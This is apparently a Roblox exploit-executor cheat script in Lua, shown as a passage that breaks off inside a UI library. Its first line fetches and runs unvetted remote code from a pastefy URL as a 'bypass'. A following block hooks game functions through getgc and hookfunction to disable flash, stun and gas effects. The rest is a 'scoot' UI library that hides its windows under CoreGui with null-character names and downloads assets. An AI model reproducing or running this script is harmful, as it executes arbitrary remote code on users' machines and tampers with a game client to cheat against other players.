-- == [Bypass] ==
loadstring(game:HttpGet("https://pastefy.app/pDhoQmem/raw"))()


-- == chatwindow ==


do
    local TextChatService = game:GetService("TextChatService")

    -- 等待 ChatWindowConfiguration 实例加载
    local chatWindowConfig = TextChatService:WaitForChild("ChatWindowConfiguration", 10)

    -- 将 Enabled 属性设为 true 以强制显示chatwindow
    if chatWindowConfig then
        chatWindowConfig.Enabled = true
        print("已加载")
    else
        warn("未加载")
    end
end



-- ============================================================
-- 受击无抖动
-- ============================================================
do
    local hookfunction = hookfunction or debug.getupvalue
    local gc = getgc(true)

    for _, func in pairs(gc) do
        if type(func) == "function" then
            local info = debug.getinfo(func)
            if info then
                local name = info.name or ""

                if name == "Flashed" then
                    hookfunction(func, function() return false end)
                end
                if name == "ShellShock" then
                    hookfunction(func, function() return false end)
                end
                if name == "TearGas" then
                    hookfunction(func, function() return end)
                end
                if name == "DamageHitEffect" then
                    hookfunction(func, function() return end)
                end
                if name == "Concussioned" then
                    hookfunction(func, function() return end)
                end
                if name == "Pepperd" then
                    hookfunction(func, function() return end)
                end
                if name == "StunEffect" then
                    hookfunction(func, function() return end)
                end
                if name == "StunGrenaded" then
                    hookfunction(func, function() return end)
                end
            end
        end
    end

    if v40 then v40.p = Vector3.new(0, 0, 0) end
    if t3 then
        if t3.TweenValue2 then t3.TweenValue2.Value = 0 end
        if t3.Amt then t3.Amt = 0 end
        if t3.Amt2 then t3.Amt2 = 0 end
        if t3.Amt3 then t3.Amt3 = 0 end
        if t3.effect4 then t3.effect4.Size = 0 end
        if t3.effect5 then t3.effect5.Size = 0 end
    end
end


--[[
    scoot ui library
    made by samet
    
    https://discord.gg/VhvTd5HV8d
    ^^ join for custom commissions

    example/documentation is at the bottom
    date: 19.07.2025
]]

if Library then
    Library:Unload()
end

local LoadTick = os.clock()

local Library do
    local Workspace = game:GetService("Workspace")
    local UserInputService = game:GetService("UserInputService")
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local RunService = game:GetService("RunService")
    local CoreGui = cloneref and cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui")
    local TweenService = game:GetService("TweenService")

    gethui = gethui or function()
        return CoreGui
    end

    local LocalPlayer = Players.LocalPlayer
    local Camera = Workspace.CurrentCamera
    local Mouse = LocalPlayer:GetMouse()

    local FromRGB = Color3.fromRGB
    local FromHSV = Color3.fromHSV
    local FromHex = Color3.fromHex

    local RGBSequence = ColorSequence.new
    local RGBSequenceKeypoint = ColorSequenceKeypoint.new
    local NumSequence = NumberSequence.new
    local NumSequenceKeypoint = NumberSequenceKeypoint.new

    local UDim2New = UDim2.new
    local UDimNew = UDim.new
    local Vector2New = Vector2.new

    local MathClamp = math.clamp
    local MathFloor = math.floor
    local MathAbs = math.abs
    local MathSin = math.sin

    local TableInsert = table.insert
    local TableFind = table.find
    local TableRemove = table.remove
    local TableConcat = table.concat
    local TableClone = table.clone
    local TableUnpack = table.unpack

    local StringFormat = string.format
    local StringFind = string.find
    local StringGSub = string.gsub
    local StringLower = string.lower
    local StringLen = string.len

    local InstanceNew = Instance.new

    local RectNew = Rect.new

    local IsMobile = UserInputService.TouchEnabled or false

    Library = {
        Theme =  { },

        MenuKeybind = tostring(Enum.KeyCode.RightControl), 
        Flags = { },

        Tween = {
            Time = 0.2,
            Style = Enum.EasingStyle.Quad,
            Direction = Enum.EasingDirection.Out
        },

        FadeSpeed = 0.2,

        Folders = {
            Directory = "scoot",
            Configs = "scoot/Configs",
            Assets = "scoot/Assets",
        },

        Images = {
            ["Saturation"] = {"Saturation.png", "https://github.com/sametexe001/images/blob/main/saturation.png?raw=true" },
            ["Value"] = { "Value.png", "https://github.com/sametexe001/images/blob/main/value.png?raw=true" },
            ["Hue"] = { "Hue.png", "https://github.com/sametexe001/images/blob/main/horizontalhue.png?raw=true" },
            ["Checkers"] = { "Checkers.png", "https://github.com/sametexe001/images/blob/main/checkers.png?raw=true" },
        },

        -- Ignore below
        Pages = { },
        Sections = { },

        Connections = { },
        Threads = { },

        ThemeMap = { },
        ThemeItems = { },

        CopiedColor = nil,

        OpenFrames = { },

        CurrentPage = nil,

        SearchItems = { },

        SetFlags = { },

        UnnamedConnections = 0,
        UnnamedFlags = 0,

        Holder = nil,
        NotifHolder = nil,
        UnusedHolder = nil,
        Font = nil,
        KeyList = nil,

        Colorpickers = { },
    }

    Library.__index = Library
    Library.Sections.__index = Library.Sections
    Library.Pages.__index = Library.Pages

    local Keys = {
        ["Unknown"]           = "Unknown",
        ["Backspace"]         = "Back",
        ["Tab"]               = "Tab",
        ["Clear"]             = "Clear",
        ["Return"]            = "Return",
        ["Pause"]             = "Pause",
        ["Escape"]            = "Escape",
        ["Space"]             = "Space",
        ["QuotedDouble"]      = '"',
        ["Hash"]              = "#",
        ["Dollar"]            = "$",
        ["Percent"]           = "%",
        ["Ampersand"]         = "&",
        ["Quote"]             = "'",
        ["LeftParenthesis"]   = "(",
        ["RightParenthesis"]  = " )",
        ["Asterisk"]          = "*",
        ["Plus"]              = "+",
        ["Comma"]             = ",",
        ["Minus"]             = "-",
        ["Period"]            = ".",
        ["Slash"]             = "`",
        ["Three"]             = "3",
        ["Seven"]             = "7",
        ["Eight"]             = "8",
        ["Colon"]             = ":",
        ["Semicolon"]         = ";",
        ["LessThan"]          = "<",
        ["GreaterThan"]       = ">",
        ["Question"]          = "?",
        ["Equals"]            = "=",
        ["At"]                = "@",
        ["LeftBracket"]       = "LeftBracket",
        ["RightBracket"]      = "RightBracked",
        ["BackSlash"]         = "BackSlash",
        ["Caret"]             = "^",
        ["Underscore"]        = "_",
        ["Backquote"]         = "`",
        ["LeftCurly"]         = "{",
        ["Pipe"]              = "|",
        ["RightCurly"]        = "}",
        ["Tilde"]             = "~",
        ["Delete"]            = "Delete",
        ["End"]               = "End",
        ["KeypadZero"]        = "Keypad0",
        ["KeypadOne"]         = "Keypad1",
        ["KeypadTwo"]         = "Keypad2",
        ["KeypadThree"]       = "Keypad3",
        ["KeypadFour"]        = "Keypad4",
        ["KeypadFive"]        = "Keypad5",
        ["KeypadSix"]         = "Keypad6",
        ["KeypadSeven"]       = "Keypad7",
        ["KeypadEight"]       = "Keypad8",
        ["KeypadNine"]        = "Keypad9",
        ["KeypadPeriod"]      = "KeypadP",
        ["KeypadDivide"]      = "KeypadD",
        ["KeypadMultiply"]    = "KeypadM",
        ["KeypadMinus"]       = "KeypadM",
        ["KeypadPlus"]        = "KeypadP",
        ["KeypadEnter"]       = "KeypadE",
        ["KeypadEquals"]      = "KeypadE",
        ["Insert"]            = "Insert",
        ["Home"]              = "Home",
        ["PageUp"]            = "PageUp",
        ["PageDown"]          = "PageDown",
        ["RightShift"]        = "RightShift",
        ["LeftShift"]         = "LeftShift",
        ["RightControl"]      = "RightControl",
        ["LeftControl"]       = "LeftControl",
        ["LeftAlt"]           = "LeftAlt",
        ["RightAlt"]          = "RightAlt"
    }

    local Themes = {
        ["Preset"] = {
            ["Background"] = FromRGB(14, 17, 15),
            ["Border"] = FromRGB(12, 12, 12),
            ["Inline"] = FromRGB(20, 24, 21),
            ["Hovered Element"] = FromRGB(37, 42, 45),
            ["Page Background"] = FromRGB(25, 30, 26),
            ["Outline"] = FromRGB(42, 49, 45),
            ["Element"] = FromRGB(30, 36, 31),
            ["Gradient"] = FromRGB(208, 208, 208),
            ["Text"] = FromRGB(235, 235, 235),
            ["Text Stroke"] = FromRGB(0, 0, 0),
            ["Placeholder Text"] = FromRGB(185, 185, 185),
            ["Accent"] = FromRGB(202, 243, 255)
        }
    }

    Library.Theme = TableClone(Themes["Preset"])

    -- Folders
    for Index, Value in Library.Folders do 
        if not isfolder(Value) then
            makefolder(Value)
        end
    end

    -- Images
    for Index, Value in Library.Images do 
        local ImageData = Value

        local ImageName = ImageData[1]
        local ImageLink = ImageData[2]
        
        if not isfile(Library.Folders.Assets .. "/" .. ImageName) then
            writefile(Library.Folders.Assets .. "/" .. ImageName, game:HttpGet(ImageLink))
        end
    end

    -- Tweening
    local Tween = { } do
        Tween.__index = Tween

        Tween.Create = function(self, Item, Info, Goal, IsRawItem)
            Item = IsRawItem and Item or Item.Instance
            Info = Info or TweenInfo.new(Library.Tween.Time, Library.Tween.Style, Library.Tween.Direction)

            local NewTween = {
                Tween = TweenService:Create(Item, Info, Goal),
                Info = Info,
                Goal = Goal,
                Item = Item
            }

            NewTween.Tween:Play()

            setmetatable(NewTween, Tween)

            return NewTween
        end

        Tween.GetProperty = function(self, Item)
            Item = Item or self.Item 

            if Item:IsA("Frame") then
                return { "BackgroundTransparency" }
            elseif Item:IsA("TextLabel") or Item:IsA("TextButton") then
                return { "TextTransparency", "BackgroundTransparency" }
            elseif Item:IsA("ImageLabel") or Item:IsA("ImageButton") then
                return { "BackgroundTransparency", "ImageTransparency" }
            elseif Item:IsA("ScrollingFrame") then
                return { "BackgroundTransparency", "ScrollBarImageTransparency" }
            elseif Item:IsA("TextBox") then
                return { "TextTransparency", "BackgroundTransparency" }
            elseif Item:IsA("UIStroke") then 
                return { "Transparency" }
            end
        end

        Tween.FadeItem = function(self, Item, Property, Visibility, Speed)
            local Item = Item or self.Item 

            local OldTransparency = Item[Property]
            Item[Property] = Visibility and 1 or OldTransparency

            local NewTween = Tween:Create(Item, TweenInfo.new(Speed or Library.Tween.Time, Library.Tween.Style, Library.Tween.Direction), {
                [Property] = Visibility and OldTransparency or 1
            }, true)

            Library:Connect(NewTween.Tween.Completed, function()
                if not Visibility then 
                    task.wait()
                    Item[Property] = OldTransparency
                end
            end)

            return NewTween
        end

        Tween.Get = function(self)
            if not self.Tween then 
                return
            end

            return self.Tween, self.Info, self.Goal
        end

        Tween.Pause = function(self)
            if not self.Tween then 
                return
            end

            self.Tween:Pause()
        end

        Tween.Play = function(self)
            if not self.Tween then 
                return
            end

            self.Tween:Play()
        end

        Tween.Clean = function(self)
            if not self.Tween then 
                return
            end

            Tween:Pause()
            self = nil
        end
    end

    -- Instances
    local Instances = { } do
        Instances.__index = Instances

        Instances.Create = function(self, Class, Properties)
            local NewItem = {
                Instance = InstanceNew(Class),
                Properties = Properties,
                Class = Class
            }

            setmetatable(NewItem, Instances)

            for Property, Value in NewItem.Properties do
                NewItem.Instance[Property] = Value
            end

            return NewItem
        end

        Instances.FadeItem = function(self, Visibility, Speed)
            local Item = self.Instance

            if Visibility == true then 
                Item.Visible = true
            end

            local Descendants = Item:GetDescendants()
            TableInsert(Descendants, Item)

            local NewTween

            for Index, Value in Descendants do 
                local TransparencyProperty = Tween:GetProperty(Value)

                if not TransparencyProperty then 
                    continue
                end

                if type(TransparencyProperty) == "table" then 
                    for _, Property in TransparencyProperty do 
                        NewTween = Tween:FadeItem(Value, Property, not Visibility, Speed)
                    end
                else
                    NewTween = Tween:FadeItem(Value, TransparencyProperty, not Visibility, Speed)
                end
            end
        end

        Instances.AddToTheme = function(self, Properties)
            if not self.Instance then 
                return
            end

            Library:AddToTheme(self, Properties)
        end

        Instances.ChangeItemTheme = function(self, Properties)
            if not self.Instance then 
                return
            end

            Library:ChangeItemTheme(self, Properties)
        end

        Instances.Connect = function(self, Event, Callback, Name)
            if not self.Instance then 
                return
            end

            if not self.Instance[Event] then 
                return
            end

            if IsMobile then
                if Event == "MouseButton1Down" or Event == "MouseButton1Click" then
                    Event = "TouchTap"
                elseif Event == "MouseButton2Down" or Event == "MouseButton2Click" then
                    Event = "TouchLongPress"
                end
            end

            return Library:Connect(self.Instance[Event], Callback, Name)
        end

        Instances.Tween = function(self, Info, Goal)
            if not self.Instance then 
                return
            end

            return Tween:Create(self, Info, Goal)
        end

        Instances.Disconnect = function(self, Name)
            if not self.Instance then 
                return
            end

            return Library:Disconnect(Name)
        end

        Instances.Clean = function(self)
            if not self.Instance then 
                return
            end

            self.Instance:Destroy()
            self = nil
        end

        Instances.MakeDraggable = function(self)
            if not self.Instance then 
                return
            end

            local Gui = self.Instance

            local Dragging = false 
            local DragStart
            local StartPosition 

            local Set = function(Input)
                local DragDelta = Input.Position - DragStart
                self:Tween(TweenInfo.new(0.16, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2New(StartPosition.X.Scale, StartPosition.X.Offset + DragDelta.X, StartPosition.Y.Scale, StartPosition.Y.Offset + DragDelta.Y)})
            end

            local InputChanged

            self:Connect("InputBegan", function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    Dragging = true

                    DragStart = Input.Position
                    StartPosition = Gui.Position

                    if InputChanged then 
                        return
                    end

                    InputChanged = Input.Changed:Connect(function()
                        if Input.UserInputState == Enum.UserInputState.End then
                            Dragging = false

                            InputChanged:Disconnect()
                            InputChanged = nil
                        end
                    end)
                end
            end)

            Library:Connect(UserInputService.InputChanged, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch then
                    if Dragging then
                        Set(Input)
                    end
                end
            end)

            return Dragging
        end

        Instances.MakeResizeable = function(self, Minimum, Maximum)
            if not self.Instance then 
                return
            end

            local Gui = self.Instance

            local Resizing = false 
            local Start = UDim2New()
            local Delta = UDim2New()
            local ResizeMax = Gui.Parent.AbsoluteSize - Gui.AbsoluteSize

            local ResizeButton = Instances:Create("ImageButton", {
				Parent = Gui,
                Image = "rbxassetid://",
				AnchorPoint = Vector2New(1, 1),
				BorderColor3 = FromRGB(0, 0, 0),
				Size = UDim2New(0, 6, 0, 6),
				Position = UDim2New(1, -4, 1, -4),
                Name = "\0",
				BorderSizePixel = 0,
				BackgroundTransparency = 1,
                ZIndex = 5,
				AutoButtonColor = false,
                Visible = true,
			})  ResizeButton:AddToTheme({ImageColor3 = "Accent"})

            local InputChanged

            ResizeButton:Connect("InputBegan", function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then

                    Resizing = true

                    Start = Gui.Size - UDim2New(0, Input.Position.X, 0, Input.Position.Y)

                    if InputChanged then 
                        return
                    end

                    InputChanged = Input.Changed:Connect(function()
                        if Input.UserInputState == Enum.UserInputState.End then
                            Resizing = false

                            InputChanged:Disconnect()
                            InputChanged = nil
                        end
                    end)
                end
            end)

            Library:Connect(UserInputService.InputChanged, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch then
                    if Resizing then
                        ResizeMax = Maximum or Gui.Parent.AbsoluteSize - Gui.AbsoluteSize

                        Delta = Start + UDim2New(0, Input.Position.X, 0, Input.Position.Y)
                        Delta = UDim2New(0, math.clamp(Delta.X.Offset, Minimum.X, ResizeMax.X), 0, math.clamp(Delta.Y.Offset, Minimum.Y, ResizeMax.Y))

                        Tween:Create(Gui, TweenInfo.new(0.17, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = Delta}, true)
                    end
                end
            end)

            return Resizing
        end

        Instances.OnHover = function(self, Function)
            if not self.Instance then 
                return
            end
            
            return Library:Connect(self.Instance.MouseEnter, Function)
        end

        Instances.OnHoverLeave = function(self, Function)
            if not self.Instance then 
                return
            end
            
            return Library:Connect(self.Instance.MouseLeave, Function)
        end

        Instances.Border = function(self, Type)
            if not self.Instance then 
                return
            end

            local Color = Type == "Border" and Library.Theme.Border or Type == "Outline" and Library.Theme.Outline
        
            local UIStroke = Instances:Create("UIStroke", {
                Parent = self.Instance,
                Color = Color,
                Thickness = 1,
                LineJoinMode = Enum.LineJoinMode.Miter
            })  UIStroke:AddToTheme({Color = Type})

            return UIStroke
        end

        Instances.TextBorder = function(self)
            if not self.Instance then 
                return
            end

            local UIStroke = Instances:Create("UIStroke", {
                Parent = self.Instance,
                Color = Library.Theme["Text Stroke"],
                Thickness = 1,
                Transparency = 0.6,
                LineJoinMode = Enum.LineJoinMode.Miter
            })  UIStroke:AddToTheme({Color = "Text Stroke"})

            return UIStroke
        end 
    end

local CustomFont = { } do
        function CustomFont:New(Name, Weight, Style, Data)
            if not isfile(Library.Folders.Assets .. "/" .. Name .. ".ttf") then 
                writefile(Library.Folders.Assets .. "/" .. Name .. ".ttf", game:HttpGet(Data.Url))
            end

            local AssetId = getcustomasset(Library.Folders.Assets .. "/" .. Name .. ".ttf")

            local FontData = {
                name = Name,
                faces = { {
                    name = "Regular",
                    weight = Weight,
                    style = Style,
                    assetId = AssetId
                } }
            }
            writefile(Library.Folders.Assets .. "/" .. Name .. ".json", HttpService:JSONEncode(FontData))         
            return Font.new(getcustomasset(Library.Folders.Assets .. "/" .. Name .. ".json"))
        end
        function CustomFont:Get(Name)
            if isfile(Library.Folders.Assets .. "/" .. Name .. ".json") then
                return Font.new(getcustomasset(Library.Folders.Assets .. "/" .. Name .. ".json"))
            end
        end

        CustomFont:New("Monaco", 400, "Regular", {
            Url = "https://github.com/sametexe001/luas/raw/refs/heads/main/fonts/Monaco.ttf"
        })

        Library.Font = CustomFont:Get("Monaco")
    end


    Library.Holder = Instances:Create("ScreenGui", {
        Parent = gethui(),
        Name = "\0",
        ZIndexBehavior = Enum.ZIndexBehavior.Global,
        DisplayOrder = 2,
        ResetOnSpawn = false
    })

    Library.UnusedHolder = Instances:Create("ScreenGui", {
        Parent = gethui(),
        Name = "\0",
        ZIndexBehavior = Enum.ZIndexBehavior.Global,
        Enabled = false,
        ResetOnSpawn = false
    })

    Library.NotifHolder = Instances:Create("Frame", {
        Parent = Library.Holder.Instance,
        Name = "\0",
        BackgroundTransparency = 1,
        Size = UDim2New(0, 0, 1, 0),
        BorderColor3 = FromRGB(0, 0, 0),
        BorderSizePixel = 0,
        AutomaticSize = Enum.AutomaticSize.X,
        BackgroundColor3 = FromRGB(255, 255, 255)
    })

    Instances:Create("UIListLayout", {
        Parent = Library.NotifHolder.Instance,
        Name = "\0",
        VerticalAlignment = Enum.VerticalAlignment.Bottom,
        Padding = UDimNew(0, 12),
        SortOrder = Enum.SortOrder.LayoutOrder
    })

    Instances:Create("UIPadding", {
        Parent = Library.NotifHolder.Instance,
        Name = "\0",
        PaddingTop = UDimNew(0, 12),
        PaddingBottom = UDimNew(0, 12),
        PaddingRight = UDimNew(0, 12),
        PaddingLeft = UDimNew(0, 12)
    })

    Library.Unload = function(self)
        for Index, Value in self.Connections do 
            Value.Connection:Disconnect()
        end

        for Index, Value in self.Threads do 
            coroutine.close(Value)
        end

        if self.Holder then 
            self.Holder:Clean()
        end

        Library = nil 
        getgenv().Library = nil

        UserInputService.MouseIconEnabled = true
    end

    Library.GetImage = function(self, Image)
        local ImageData = self.Images[Image]

        if not ImageData then 
            return
        end

        return getcustomasset(self.Folders.Assets .. "/" .. ImageData[1])
    end

    Library.Round = function(self, Number, Float)
        local Multiplier = 1 / (Float or 1)
        return MathFloor(Number * Multiplier) / Multiplier
    end

    Library.Thread = function(self, Function)
        local NewThread = coroutine.create(Function)
        
        coroutine.wrap(function()
            coroutine.resume(NewThread)
        end)()

        TableInsert(self.Threads, NewThread)
        return NewThread
    end
    
    Library.SafeCall = function(self, Function, ...)
        local Arguements = { ... }
        local Success, Result = pcall(Function, TableUnpack(Arguements))

        if not Success then
            warn(Result)
            return false
        end

        return Success
    end

    Library.Connect = function(self, Event, Callback, Name)
        Name = Name or StringFormat("Connection%s%s", self.UnnamedConnections + 1, HttpService:GenerateGUID(false))

        local NewConnection = {
            Event = Event,
            Callback = Callback,
            Name = Name,
            Connection = nil
        }

        Library:Thread(function()
            NewConnection.Connection = Event:Connect(Callback)
        end)

        TableInsert(self.Connections, NewConnection)
        return NewConnection
    end

    Library.Disconnect = function(self, Name)
        for _, Connection in self.Connections do 
            if Connection.Name == Name then
                Connection.Connection:Disconnect()
                break
            end
        end
    end

    Library.NextFlag = function(self)
        local FlagNumber = self.UnnamedFlags + 1
        return StringFormat("flag_number_%s_%s", FlagNumber, HttpService:GenerateGUID(false))
    end

    Library.AddToTheme = function(self, Item, Properties)
        Item = Item.Instance or Item 

        local ThemeData = {
            Item = Item,
            Properties = Properties,
        }

        for Property, Value in ThemeData.Properties do
            if type(Value) == "string" then
                Item[Property] = self.Theme[Value]
            else
                Item[Property] = Value()
            end
        end

        TableInsert(self.ThemeItems, ThemeData)
        self.ThemeMap[Item] = ThemeData
    end

	Library.ToRich = function(self, Text, Color)
        if not Color then
            return `<font color="rgb(255, 255, 255)">{Text}</font>`
        end

        if not Color.R or not Color.G or not Color.B then
            return `<font color="rgb(255, 255, 255)">{Text}</font>`
        end

		return `<font color="rgb({MathFloor(Color.R * 255)}, {MathFloor(Color.G * 255)}, {MathFloor(Color.B * 255)})">{Text}</font>`
	end

    Library.GetConfig = function(self)
        local c = {}
        for i, v in next, Library.Flags do
            if type(v) == "table" and v.Key then
                c[i] = {Key = tostring(v.Key), Mode = v.Mode, Toggled = v.Toggled}
            elseif type(v) == "table" and v.Color then
                c[i] = {Color = v.Color, Alpha = v.Alpha}
            else
                c[i] = v
            end
        end
        return game:GetService("HttpService"):JSONEncode(c)
    end

    Library.LoadConfig = function(self, g)
        local s, d = pcall(game:GetService("HttpService").JSONDecode, game:GetService("HttpService"), g)
        if not s then return end
        for i, v in next, d do
            local f = Library.SetFlags[i]
            if f then
                if type(v) == "table" and v.Color then
                    f(v.Color, v.Alpha)
                else
                    f(v)
                end
            end
        end
    end

    Library.DeleteConfig = function(self, Config)
        if isfile(Library.Folders.Configs .. "/" .. Config) then 
            delfile(Library.Folders.Configs .. "/" .. Config)
        end
    end

    Library.RefreshConfigsList = function(self, e)
        local l = {}
        for _, v in next, listfiles(Library.Folders.Configs) do
            local n = v:match("([^\\/]+)$")
            table.insert(l, n)
        end
        e:Refresh(l)
    end

    Library.ChangeItemTheme = function(self, Item, Properties)
        Item = Item.Instance or Item

        if not self.ThemeMap[Item] then 
            return
        end

        self.ThemeMap[Item].Properties = Properties
        self.ThemeMap[Item] = self.ThemeMap[Item]
    end

    Library.ChangeTheme = function(self, Theme, Color)
        self.Theme[Theme] = Color

        for _, Item in self.ThemeItems do
            for Property, Value in Item.Properties do
                if type(Value) == "string" and Value == Theme then
                    Item.Item[Property] = Color
                elseif type(Value) == "function" then
                    Item.Item[Property] = Value()
                end
            end
        end
    end

    Library.IsMouseOverFrame = function(self, Frame, XOffset, YOffset)
        Frame = Frame.Instance
        XOffset = XOffset or 0 
        YOffset = YOffset or 0

        local MousePosition = Vector2New(Mouse.X + XOffset, Mouse.Y + YOffset)

        return MousePosition.X >= Frame.AbsolutePosition.X and MousePosition.X <= Frame.AbsolutePosition.X + Frame.AbsoluteSize.X 
        and MousePosition.Y >= Frame.AbsolutePosition.Y and MousePosition.Y <= Frame.AbsolutePosition.Y + Frame.AbsoluteSize.Y
    end

    Library.Lerp = function(self, Start, Finish, Time)
        return Start + (Finish - Start) * Time
    end

    -- Components
    local Components = { } do
        Components.Window = function(self, Data)
            local Items = { } do
                Items["Window"] = Instances:Create("Frame", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    AnchorPoint = Data.AnchorPoint,
                    Position = Data.Position,
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = Data.Size,
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(14, 17, 15)
                })  Items["Window"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})
local w = Items["Window"].Instance
local d1 = Instance.new("UIScale", w)
d1.Scale = 0.8
getgenv().d2 = d1
local d3 = Instance.new("ImageButton", w)
d3.Name = "ResizeHitbox"
d3.Size = UDim2.new(0, 80, 0, 80) 
d3.Position = UDim2.new(1, 0, 1, 0)
d3.AnchorPoint = Vector2.new(1, 1)
d3.BackgroundTransparency = 1
d3.Image = ""
d3.Active = true
d3.ZIndex = 9
local d4 = Instance.new("TextLabel", d3)
d4.Size = UDim2.new(0, 15, 0, 15)
d4.Position = UDim2.new(1, -1, 1, 3.2) 
d4.AnchorPoint = Vector2.new(1, 1)
d4.BackgroundTransparency = 1
d4.Text = "◢"
d4.TextSize = 25
d4.TextColor3 = Library.Theme.Accent
d4.Font = Enum.Font.SourceSansBold
d4.TextXAlignment = "Right"
d4.TextYAlignment = "Bottom"
d4.ZIndex = 9

local u = game:GetService("UserInputService")
local a = false 

d3.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then a = true end
end)

u.InputChanged:Connect(function(i)
    if a and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local sc = getgenv().d2.Scale
        local nw = (i.Position.X - w.AbsolutePosition.X) / sc
        local nh = (i.Position.Y - w.AbsolutePosition.Y + 36) / sc 
        if nw < 350 then nw = 350 end
        if nh < 350 then nh = 350 end
        
        w.Size = UDim2.new(0, nw, 0, nh)
    end
end)

u.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then a = false end
end)
                if Data.Draggable then 
                    Items["Window"]:MakeDraggable()
                end

                if Data.Resizeable then 
                    Items["Window"]:MakeResizeable(Vector2New(Data.Size.X.Offset, Data.Size.Y.Offset), Vector2New(9999, 9999))
                end

                Items["UIStroke"] = Items["Window"]:Border("Outline")
            end

            return Items
        end

        Components.AutosizingLabel = function(self, Data)
            local Label = { } 

            local Items = { } do
                Items["Label"] = Instances:Create("TextLabel", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Text,
                    BackgroundTransparency = 1,
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.XY,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Label"]:AddToTheme({TextColor3 = "Text"})

                Items["UIStroke"] = Items["Label"]:TextBorder()
            end

            function Label:SetProperty(Property, Value)
                Items["Label"].Instance[Property] = Value
            end

            return Label, Items
        end

        Components.WindowPage = function(self, Data)
            local Page = {
                Active = false,
                SubPages = { },
                Items = { },
                Window = Data.Window,
                ColumnsData = { }
            }

            local Items = { } do
                Items["Inactive"] = Instances:Create("TextButton", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(0, 0, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Text = "",
                    AutoButtonColor = false,
                    BackgroundTransparency = 0.6000000238418579,
                    Size = UDim2New(1, 0, 0, 25),
                    BorderSizePixel = 2,
                    TextSize = 14,
                    BackgroundColor3 = FromRGB(25, 30, 26)
                })  Items["Inactive"]:AddToTheme({BackgroundColor3 = "Page Background", BorderColor3 = "Border"})

                Items["ButtonBorder"] = Instances:Create("UIStroke", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    Color = FromRGB(61, 60, 65),
                    Transparency = 0.6,
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                })  Items["ButtonBorder"]:AddToTheme({Color = "Outline"})

                Items["Liner"] = Instances:Create("Frame", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(0, 1, 1, 0),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(25, 30, 26)
                })  Items["Liner"]:AddToTheme({BackgroundColor3 = "Accent"})

                Items["Text"] = Instances:Create("TextLabel", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Name,
                    AnchorPoint = Vector2New(0, 0.5),
                    Size = UDim2New(0, 0, 0, 15),
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, 8, 0.5, 0),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

                Items["TextStroke"] = Items["Text"]:TextBorder()

                Items["Glow"] = Instances:Create("Frame", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(0, 20, 1, 0),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(25, 30, 26)
                })  Items["Glow"]:AddToTheme({BackgroundColor3 = "Accent"})

                Items["GlowGradient"] = Instances:Create("UIGradient", {
                    Parent = Items["Glow"].Instance,
                    Name = "\0",
                    Transparency = NumSequence{NumSequenceKeypoint(0, 0), NumSequenceKeypoint(0.193, 0.8687499761581421), NumSequenceKeypoint(0.504, 0.96875), NumSequenceKeypoint(1, 1)}
                })

                Items["Page"] = Instances:Create("Frame", {
                    Parent = Data.ContentHolder.Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    Visible = false,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 1, 0),
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                if Data.SubPages then
                    Items["SubPages"] = Instances:Create("Frame", {
                        Parent = Items["Page"].Instance,
                        Name = "\0",
                        Size = UDim2New(0, 0, 0, 35),
                        BorderColor3 = FromRGB(42, 49, 45),
                        BorderSizePixel = 2,
                        AutomaticSize = Enum.AutomaticSize.X,
                        BackgroundColor3 = FromRGB(20, 24, 21)
                    })  Items["SubPages"]:AddToTheme({BackgroundColor3 = "Page Background", BorderColor3 = "Outline"})

                    Items["SubPages"]:Border("Border")

                    Instances:Create("UIPadding", {
                        Parent = Items["SubPages"].Instance,
                        Name = "\0",
                        PaddingRight = UDimNew(0, 7),
